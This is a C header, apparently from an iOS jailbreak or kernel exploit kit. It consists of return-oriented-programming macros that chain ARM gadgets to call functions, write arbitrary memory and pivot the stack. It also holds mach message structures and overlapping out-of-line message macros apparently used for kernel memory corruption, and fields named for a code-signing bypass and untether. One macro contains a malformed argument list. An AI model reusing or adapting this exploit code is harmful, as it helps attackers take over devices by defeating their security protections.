#define RopCallDerefFunctionPointer6Deref2(    push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f) \
    RopCallDerefFunctionPointerUp10CountDeref2(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, 0, 0, 0, 0, 6, D_D2_F | F_ARGS_6)
#define RopCallDerefFunctionPointer5Deref2(    push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e) \
    RopCallDerefFunctionPointerUp10CountDeref2(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, 0, 0, 0, 0, 0, 5, D_D2_F | F_ARGS_5)
#define RopCallDerefFunctionPointer4Deref2(    push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d) \
    RopCallDerefFunctionPointerUp10CountDeref2(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, 0, 0, 0, 0, 0, 0, 4, D_D2_F | F_ARGS_4)
#define RopCallDerefFunctionPointer3Deref2(    push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c) \
    RopCallDerefFunctionPointerUp10CountDeref2(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, 0, 0, 0, 0, 0, 0, 0, 3, D_D2_F | F_ARGS_3)
#define RopCallDerefFunctionPointer2Deref2(    push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b) \
    RopCallDerefFunctionPointerUp10CountDeref2(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, 0, 0, 0, 0, 0, 0, 0, 0, 2, D_D2_F | F_ARGS_2)

//
// pointer deref 3 args functions
//

#define RopCallDerefFunctionPointer10Deref3(   push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg2, read_ptr_2, a, b, c, d, e, f, g, h, i, l) \
    RopCallDerefFunctionPointerUp10CountDeref3(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg2, read_ptr_2, a, b, c, d, , e, f, g, h, i, l,10, D_D3_F | F_ARGS_10)
#define RopCallDerefFunctionPointer9Deref3(    push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg2, read_ptr_2, a, b, c, d, e, f, g, h, i) \
    RopCallDerefFunctionPointerUp10CountDeref3(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg2, read_ptr_2, a, b, c, d, e, f, g, h, i, 0, 9, D_D3_F | F_ARGS_9)
#define RopCallDerefFunctionPointer8Deref3(    push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg2, read_ptr_2, a, b, c, d, e, f, g, h) \
    RopCallDerefFunctionPointerUp10CountDeref3(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg2, read_ptr_2, a, b, c, d, e, f, g, h, 0, 0, 8, D_D3_F | F_ARGS_8)
#define RopCallDerefFunctionPointer7Deref3(    push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg2, read_ptr_2, a, b, c, d, e, f, g) \
    RopCallDerefFunctionPointerUp10CountDeref3(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg2, read_ptr_2, a, b, c, d, e, f, g, 0, 0, 0, 7, D_D3_F | F_ARGS_7)
#define RopCallDerefFunctionPointer6Deref3(    push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg2, read_ptr_2, a, b, c, d, e, f) \
    RopCallDerefFunctionPointerUp10CountDeref3(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg2, read_ptr_2, a, b, c, d, e, f, 0, 0, 0, 0, 6, D_D3_F | F_ARGS_6)
#define RopCallDerefFunctionPointer5Deref3(    push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg2, read_ptr_2, a, b, c, d, e) \
    RopCallDerefFunctionPointerUp10CountDeref3(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg2, read_ptr_2, a, b, c, d, e, 0, 0, 0, 0, 0, 5, D_D3_F | F_ARGS_5)
#define RopCallDerefFunctionPointer4Deref3(    push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg2, read_ptr_2, a, b, c, d) \
    RopCallDerefFunctionPointerUp10CountDeref3(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg2, read_ptr_2, a, b, c, d, 0, 0, 0, 0, 0, 0, 4, D_D3_F | F_ARGS_4)
#define RopCallDerefFunctionPointer3Deref3(    push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg2, read_ptr_2, a, b, c) \
    RopCallDerefFunctionPointerUp10CountDeref3(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg2, read_ptr_2, a, b, c, 0, 0, 0, 0, 0, 0, 0, 3, D_D3_F | F_ARGS_3)

//
// custom functions
//

#define RopCallDerefFunctionPointerStack8Deref1(push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h) \
RopSetupLRClearParams(push, 12); \
DerefParam(push, repl_arg_0 + 4, read_ptr_0, 1); \
DerefFunctionPointer(push, fptr_deref); \
push = (uint32_t)pop_r0r1r2r3r5r7pc; \
push = (uint32_t)0; \
push = (uint32_t)0; \
push = (uint32_t)0; \
push = (uint32_t)0; \
push = 0x45454545; \
push = (uint32_t)(m_m_scratch); \
push = (uint32_t)0x13371337;\
push = (uint32_t)a; \
push = (uint32_t)b; \
push = (uint32_t)c; \
push = (uint32_t)d; \
push = (uint32_t)e; \
push = (uint32_t)f; \
push = (uint32_t)g; \
push = (uint32_t)h; \
push = (CUSTON_FUNC | DEREF1 | F_ARGS_8)

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#define RopAddWrite(push, where, what) \
LoadIntoR0(push, where);\
push = pop_r2pc;\
push = what;\
push = add_r0_r2_pop_r4r5r7pc;\
push = 0x44444444;\
push = 0x45454545;\
push = 0x47474747;\
StoreR0(push, where)

#define RopAddR0(push, what) \
push = pop_r2pc;\
push = what;\
push = add_r0_r2_pop_r4r5r7pc;\
push = 0x44444444;\
push = 0x45454545;\
push = 0x47474747;

#define RopAddWriteDeref(push, where, whatptr) \
LoadIntoR0(push, whatptr);\
push = (uint32_t)pop_r4r7pc;\
tmp = (4*6) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
push = (uint32_t)tmp  - 8; \
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch;\
push = pop_r2pc;\
push = 0;\
LoadIntoR0(push, where);\
push = add_r0_r2_pop_r4r5r7pc;\
push = 0x44444444;\
push = 0x45454545;\
push = 0x47474747;\
StoreR0(push, where)

#define kern_uint_t uint64_t

// in7egral macroses
#define RopRotateRight2R0(push) \
push = lsrs_r0_r0_2_pop_r4r5r7pc;\
push = 0x44444444;\
push = 0x45454545;\
push = 0x47474747;

#define StoreR1(push, where) \
push = (uint32_t)pop_r4r7pc; \
push = (uint32_t)where - 4; \
push = (uint32_t)m_m_scratch; \
push = (uint32_t)mov_r0_r4_pop_r4r7pc; \
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch; \
push = (uint32_t)str_r1_r0_4_pop_r4r5r7pc; \
push = (uint32_t)0x44444444; \
push = (uint32_t)0x45454545; \
push = (uint32_t)m_m_scratch;

#define MakeCrashHere(push, code) \
push = (uint32_t)pop_r7pc; \
push = (uint32_t)(0xBAD00000 + code); \
push = (uint32_t)0xBAD7E575; // should crash the app

#define MakeCrashHereDontTouchR7(push, code) \
push = (uint32_t)0xBAD00000 + code; // should crash the app

#define RopLoadSP(push) \
push = (uint32_t)pop_r4r7pc;\
tmp = (4*6) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
push = (uint32_t)tmp - 8; \
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc; /* store R0 to SP */ \
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch;\
push = pop_r4r7pc; \
push = 0; /* SP here */ \
push = 0x47474747; \
push = mov_sp_r4_pop_r4r7pc;

#define RopEnterNewSPFrame(push) \
push = 0x44444444; \
push = (uint32_t)m_m_scratch;

#define GET_STACK_TOP (uint32_t)(segstackbase + (void*)stack - (void*)stackbase)

// ! in7egral

#pragma pack(4)
struct mig_set_special_port_req {
    mach_msg_header_t Head;
    
    mach_msg_body_t msgh_body;
    mach_msg_port_descriptor_t port;
    
    NDR_record_t NDR;
    int which;
}  __attribute__((unused));

#pragma pack()
#pragma pack(4)

struct mig_set_special_port_rep {
    mach_msg_header_t Head;
    NDR_record_t NDR;
    kern_return_t RetCode;
    mach_msg_trailer_t trailer;
}  __attribute__((unused));

#pragma pack()
#pragma pack(4)
struct mig_set_special_port___rep
{
    mach_msg_header_t Head;
    NDR_record_t NDR;
    kern_return_t RetCode;
}  __attribute__((unused));
#pragma pack()

struct vm_map_copy {
    kern_uint_t type;
    kern_uint_t obj;
    kern_uint_t sz;
    kern_uint_t ptr;
    kern_uint_t kfree_size;
} ;

struct stat32 {
    dev_t	 	st_dev;		/* [XSI] ID of device containing file */
    ino_t	  	st_ino;		/* [XSI] File serial number */
    mode_t	 	st_mode;	/* [XSI] Mode of file (see below) */
    nlink_t		st_nlink;	/* [XSI] Number of hard links */
    uid_t		st_uid;		/* [XSI] User ID of the file */
    gid_t		st_gid;		/* [XSI] Group ID of the file */
    dev_t		st_rdev;	/* [XSI] Device ID */
#if !defined(_POSIX_C_SOURCE) || defined(_DARWIN_C_SOURCE)
    struct	timespec st_atimespec;	/* time of last access */
    struct	timespec st_mtimespec;	/* time of last data modification */
    struct	timespec st_ctimespec;	/* time of last status change */
#else
    time_t		st_atime;	/* [XSI] Time of last access */
    long		st_atimensec;	/* nsec of last access */
    time_t		st_mtime;	/* [XSI] Last data modification time */
    long		st_mtimensec;	/* last data modification nsec */
    time_t		st_ctime;	/* [XSI] Time of last status change */
    long		st_ctimensec;	/* nsec of last status change */
#endif
    off_t		st_size;	/* [XSI] file size, in bytes */
    blkcnt_t	st_blocks;	/* [XSI] blocks allocated for file */
    blksize_t	st_blksize;	/* [XSI] optimal blocksize for I/O */
    __uint32_t	st_flags;	/* user defined flags for file */
    __uint32_t	st_gen;		/* file generation number */
    __int32_t	st_lspare;	/* RESERVED: DO NOT USE! */
    __int64_t	st_qspare[2];	/* RESERVED: DO NOT USE! */
};

typedef struct args {
    uint32_t cache_slide;
    int _pipe;
    int _write;
    int ptr_dprintf;
    int copyaddr;
    int readaddr;
    char structData[2048];
    int structSize;
    uint64_t inputScalar[1];
    char initmsg[2048];
    char testmsg[128];
    char gasgauge_match[256];
    char rootdomainuserclient_match[256];
    char a[256];
    char b[256];
    char c[256];
    char msga[256];
    char msgb[256];
    int zero;
    int fd1;
    int fd2;
    int fd3;
    //
    // new ROP
    //
    // mmap cs_bypass/that_guy/untether
    int indata;
    int filedata1;
    int filedata2;
    int addr;
    int text_addr;
    //
    // search dyld
    int p[2];
    int __dyld_start;
    int __loop;
    int __end_of_loop0;
    int __nextAddress;
    int __end_of_loop;
    int writeResult0;
    int writeResult;
    int loopI;
    int antipage2;
    int antipage;
    int antipage3;
    int lastWriteResult;
    char mscratch[8192];
} args_t;

#define m_m_scratch ((uint32_t)(&(args_seg->mscratch)[1024]))
#define PUSH (*stack++)
#define SEG_VAR(var) ((char*)(&(args_seg->var)))
#define SEG_VAR_(var, i) ((uint32_t)(&((args_seg->var)[i])))

#define ReadWriteOverlap() \
RecvMsg(PUSH, overlap_port, tmp_msg);\
LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));\
StoreR0(PUSH, SEG_VAR(oolmsg_template_2048.desc.address));\
SendMsg(PUSH, overlap_port, oolmsg_template_2048);

#define ReadWriteScratchOverlap() \
RecvMsg(PUSH, overlap_port, tmp_msg);\
WriteWhatWhere(PUSH, SEG_VAR(scratch[0]), SEG_VAR(oolmsg_template_2048.desc.address));\
SendMsg(PUSH, overlap_port, oolmsg_template_2048);


#define ReadWriteOverlapped1024() \
RecvMsg(PUSH, overlapped_port, tmp_msg);\
LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));\
StoreR0(PUSH, SEG_VAR(oolmsg_template.desc.address));\
SendMsg(PUSH, overlapped_port, oolmsg_template);

#define ReadWriteOverlapped512() \
RecvMsg(PUSH, overlapped_port, tmp_msg);\
LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));\
StoreR0(PUSH, SEG_VAR(oolmsg_template_512.desc.address));\
SendMsg(PUSH, overlapped_port, oolmsg_template_512);



#define step(x) \
  LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));\
  RopAddR0(PUSH, 1024 - 0x58 + x);\
  DerefR0(PUSH);\
  StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + x]))

#define tmptoscratch() \
  for (int i = 0; i < 0x58; i += 4) {\
    step(i);\
 }

#define RecvMsg(push, i, msg) \
LoadIntoR0(PUSH, SEG_VAR(holder[i]));\
StoreR0(PUSH, SEG_VAR(msg.header.msgh_remote_port));\
RopCallFunction9Deref2(PUSH, @"_mach_msg_trap", 4, SEG_VAR(holder[i]), 5, SEG_VAR(zero), SEG_VAR(msg), MACH_RCV_MSG, 0, sizeof(oolmsgrcv_t), 0, 0, 0,0,0)

#define SendMsg(push, i, msg) \
LoadIntoR0(PUSH, SEG_VAR(holder[i]));\
StoreR0(PUSH, SEG_VAR(msg.header.msgh_remote_port));\
RopCallFunction3(PUSH, @"_mach_msg_trap", SEG_VAR(msg), MACH_SEND_MSG, sizeof(oolmsg_t))

#endif /* defines_h */
